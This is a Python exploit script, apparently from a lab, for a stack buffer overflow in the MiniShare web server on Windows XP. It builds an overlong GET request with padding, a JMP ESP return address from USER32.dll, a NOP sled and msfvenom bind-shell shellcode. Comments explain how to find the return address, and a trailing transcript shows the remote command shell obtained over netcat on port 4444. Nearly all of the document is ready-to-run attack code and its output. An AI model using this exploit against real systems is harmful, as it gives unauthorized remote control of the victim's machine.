#!/usr/bin/python

import socket, sys

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect((sys.argv[1], 80))

buffer = "GET "

buffer += "A" * 1787

"""
Run the program
View -> Executable Modules -> USER32.dll
Search for -> Command -> JMP ESP -> Note tha address
Replace BBBB with the address
This address will jump back to where the shellcode is located
"""

buffer += "\x53\x93\x42\x7e"

buffer += "\x90" * 25

# msfvenom -p windows/shell_bind_tcp -f c -a x86 -b "\x00\x0d"
buffer += ("\xb8\x9e\xa8\xc8\x41\xd9\xcd\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x53\x31\x42\x12\x03\x42\x12\x83\x5c\xac\x2a\xb4\x9c\x45\x28"
"\x37\x5c\x96\x4d\xb1\xb9\xa7\x4d\xa5\xca\x98\x7d\xad\x9e\x14"
"\xf5\xe3\x0a\xae\x7b\x2c\x3d\x07\x31\x0a\x70\x98\x6a\x6e\x13"
"\x1a\x71\xa3\xf3\x23\xba\xb6\xf2\x64\xa7\x3b\xa6\x3d\xa3\xee"
"\x56\x49\xf9\x32\xdd\x01\xef\x32\x02\xd1\x0e\x12\x95\x69\x49"
"\xb4\x14\xbd\xe1\xfd\x0e\xa2\xcc\xb4\xa5\x10\xba\x46\x6f\x69"
"\x43\xe4\x4e\x45\xb6\xf4\x97\x62\x29\x83\xe1\x90\xd4\x94\x36"
"\xea\x02\x10\xac\x4c\xc0\x82\x08\x6c\x05\x54\xdb\x62\xe2\x12"
"\x83\x66\xf5\xf7\xb8\x93\x7e\xf6\x6e\x12\xc4\xdd\xaa\x7e\x9e"
"\x7c\xeb\xda\x71\x80\xeb\x84\x2e\x24\x60\x28\x3a\x55\x2b\x25"
"\x8f\x54\xd3\xb5\x87\xef\xa0\x87\x08\x44\x2e\xa4\xc1\x42\xa9"
"\xcb\xfb\x33\x25\x32\x04\x44\x6c\xf1\x50\x14\x06\xd0\xd8\xff"
"\xd6\xdd\x0c\x95\xde\x78\xff\x88\x23\x3a\xaf\x0c\x8b\xd3\xa5"
"\x82\xf4\xc4\xc5\x48\x9d\x6d\x38\x73\xb0\x31\xb5\x95\xd8\xd9"
"\x93\x0e\x74\x18\xc0\x86\xe3\x63\x22\xbf\x83\x2c\x24\x78\xac"
"\xac\x62\x2e\x3a\x27\x61\xea\x5b\x38\xac\x5a\x0c\xaf\x3a\x0b"
"\x7f\x51\x3a\x06\x17\xf2\xa9\xcd\xe7\x7d\xd2\x59\xb0\x2a\x24"
"\x90\x54\xc7\x1f\x0a\x4a\x1a\xf9\x75\xce\xc1\x3a\x7b\xcf\x84"
"\x07\x5f\xdf\x50\x87\xdb\x8b\x0c\xde\xb5\x65\xeb\x88\x77\xdf"
"\xa5\x67\xde\xb7\x30\x44\xe1\xc1\x3c\x81\x97\x2d\x8c\x7c\xee"
"\x52\x21\xe9\xe6\x2b\x5f\x89\x09\xe6\xdb\xb9\x43\xaa\x4a\x52"
"\x0a\x3f\xcf\x3f\xad\xea\x0c\x46\x2e\x1e\xed\xbd\x2e\x6b\xe8"
"\xfa\xe8\x80\x80\x93\x9c\xa6\x37\x93\xb4")

buffer += "C" * 300

buffer += " HTTP/1.1\r\n\r\n"

sock.send(buffer)

sock.close()

"""
$ nc 192.168.1.12 4444
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\Program Files\MiniShare>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection:

        Connection-specific DNS Suffix  . : 
        IP Address. . . . . . . . . . . . : 192.168.1.12
        Subnet Mask . . . . . . . . . . . : 255.255.255.0
        Default Gateway . . . . . . . . . : 192.168.1.1

Ethernet adapter Bluetooth Network Connection:

        Media State . . . . . . . . . . . : Media disconnected

C:\Program Files\MiniShare>netstat -an
netstat -an

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
  TCP    127.0.0.1:1028         0.0.0.0:0              LISTENING
  TCP    192.168.1.12:80        192.168.1.13:43738     CLOSE_WAIT
  TCP    192.168.1.12:139       0.0.0.0:0              LISTENING
  TCP    192.168.1.12:4444      192.168.1.13:49712     ESTABLISHED
  UDP    0.0.0.0:445            *:*                    
  UDP    0.0.0.0:500            *:*                    
  UDP    0.0.0.0:4500           *:*                    
  UDP    127.0.0.1:123          *:*                    
  UDP    127.0.0.1:1900         *:*                    
  UDP    192.168.1.12:123       *:*                    
  UDP    192.168.1.12:137       *:*                    
  UDP    192.168.1.12:138       *:*                    
  UDP    192.168.1.12:1900      *:*                    

C:\Program Files\MiniShare>
"""
